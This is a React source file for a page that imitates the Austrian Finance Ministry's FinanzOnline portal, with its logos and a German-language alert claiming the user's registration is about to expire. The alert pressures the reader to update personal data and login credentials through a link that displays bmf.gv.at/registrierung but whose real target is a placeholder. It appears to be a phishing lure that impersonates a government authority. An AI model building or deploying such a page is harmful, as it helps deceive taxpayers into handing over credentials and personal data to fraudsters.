import finanzonlineLogo from "@/assets/finanzonline_at_Logo.svg";
import bmfLogo from "@/assets/bmf_logo.svg";
import { Info } from "lucide-react";

const Index = () => {
  return (
    <div className="min-h-screen bg-white">
      <header className="bg-white">
        <div className="container mx-auto flex items-center justify-between px-4 py-4">
          <div>
            <a href="#">
              <span className="sr-only">Zur Startseite</span>
              <img src={finanzonlineLogo} alt="FinanzOnline" className="h-8 md:h-12" />
            </a>
          </div>
          <div>
            <a
              href="https://www.bmf.gv.at/public.html"
              target="_blank"
              rel="noopener noreferrer"
            >
              <span className="sr-only">Zur Homepage des Bundesministerium für Finanzen</span>
              <img src={bmfLogo} alt="BMF Logo" className="h-8 md:h-10" />
            </a>
          </div>
        </div>
        <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
          Willkommen bei FinanzOnline
        </h1>
      </header>

      <div className="container mx-auto px-4 py-4">
        <div className="rounded border-l-4 border-[#004a99] bg-[#e8f0fe] p-5" role="alert">
          <div className="mb-3 flex items-center gap-2">
            <Info className="h-5 w-5 text-[#004a99]" />
            <span className="text-base font-bold text-[#004a99]">Hinweis</span>
          </div>
          <div className="text-sm leading-relaxed text-gray-800">
            <p className="mb-3">
              <b>Wichtiger Hinweis zur Aktualisierung Ihrer Registrierungsdaten</b>
            </p>
            <p className="mb-3">
              Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin uneingeschränkten
              Zugang zu allen Services von FinanzOnline zu gewährleisten, bitten wir Sie dringend,
              Ihre persönlichen Daten sowie Ihre Zugangsdaten zeitnah zu überprüfen und zu
              aktualisieren.
            </p>
            <p className="mb-3">
              Bitte beachten Sie: Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr
              Zugang zu FinanzOnline eingeschränkt oder vorübergehend gesperrt werden. Dies
              betrifft unter anderem die Abgabe von Steuererklärungen, die Einsicht in
              Bescheide sowie die Nutzung weiterer elektronischer Services des
              Bundesministeriums für Finanzen.
            </p>
            <p>
              <b>
                Aktualisieren Sie Ihre Daten jetzt unter{" "}
                <a
                  href="#"
                  className="text-[#004a99] underline hover:text-[#003366]"
                >
                  bmf.gv.at/registrierung
                </a>
              </b>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
